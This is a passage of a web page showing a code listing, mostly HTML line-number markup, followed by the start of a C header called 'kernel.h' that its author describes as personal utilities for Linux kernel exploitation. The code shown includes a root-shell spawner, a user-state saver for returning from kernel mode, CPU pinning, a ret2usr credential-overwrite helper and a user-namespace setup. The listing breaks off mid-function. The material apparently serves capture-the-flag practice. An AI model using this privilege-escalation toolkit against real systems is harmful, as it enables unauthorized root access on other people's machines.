class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @file kernel.h</span></span><br><span class="line"><span class="comment"> * @author arttnba3 (arttnba@gmail.com)</span></span><br><span class="line"><span class="comment"> * @brief arttnba3&#x27;s personal utils for kernel pwn</span></span><br><span class="line"><span class="comment"> * @version 1.1</span></span><br><span class="line"><span class="comment"> * @date 2023-05-20</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @copyright Copyright (c) 2023 arttnba3</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> A3_KERNEL_PWN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3_KERNEL_PWN_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pushf;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_core</span><span class="params">(<span class="keyword">int</span> core)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for ret2usr attacker */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_privilige</span><span class="params">(<span class="keyword">size_t</span> prepare_kernel_cred, <span class="keyword">size_t</span> commit_creds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*prepare_kernel_cred_ptr)(<span class="keyword">void</span> *) = </span><br><span class="line">                                         (<span class="keyword">void</span> *(*)(<span class="keyword">void</span>*)) prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*commit_creds_ptr)(<span class="keyword">void</span> *) = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>*)) commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span 